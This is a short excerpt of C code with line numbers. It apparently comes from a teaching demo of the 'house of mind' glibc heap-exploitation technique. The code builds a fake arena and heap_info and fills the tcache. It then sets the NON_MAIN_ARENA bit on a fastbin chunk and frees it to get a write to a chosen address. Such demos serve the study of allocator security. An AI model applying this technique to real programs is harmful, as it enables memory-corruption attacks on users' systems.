117 int HEAP_MAX_SIZE = 0x4000000;
118 int MAX_SIZE = (128*1024) - 0x100;

122 uint8_t* fake_arena = malloc(0x1000); 
123 uint8_t* target_loc = fake_arena + 0x30;

125 uint8_t* target_chunk = (uint8_t*) fake_arena - 0x10;

135 fake_arena[0x888] = 0xFF;
136 fake_arena[0x889] = 0xFF; 
137 fake_arena[0x88a] = 0xFF; 

143 uint64_t new_arena_value = (((uint64_t) target_chunk) + HEAP_MAX_SIZE) & ~(HEAP_MAX_SIZE - 1);
144 uint64_t* fake_heap_info = (uint64_t*) new_arena_value;

146 uint64_t* user_mem = malloc(MAX_SIZE);
155 while((long long)user_mem < new_arena_value){
156     user_mem = malloc(MAX_SIZE);
157 }

161 uint64_t* fastbin_chunk = malloc(0x50);
162 uint64_t* chunk_ptr = fastbin_chunk - 2;

167 uint64_t* tcache_chunks[7];
168 for(int i = 0; i < 7; i++){
169     tcache_chunks[i] = malloc(0x50);
170 }    
171 for(int i = 0; i < 7; i++){
172     free(tcache_chunks[i]);
173 }

191 fake_heap_info[0] = (uint64_t) fake_arena;
208 chunk_ptr[1] = 0x60 | 0x4;
230 free(fastbin_chunk);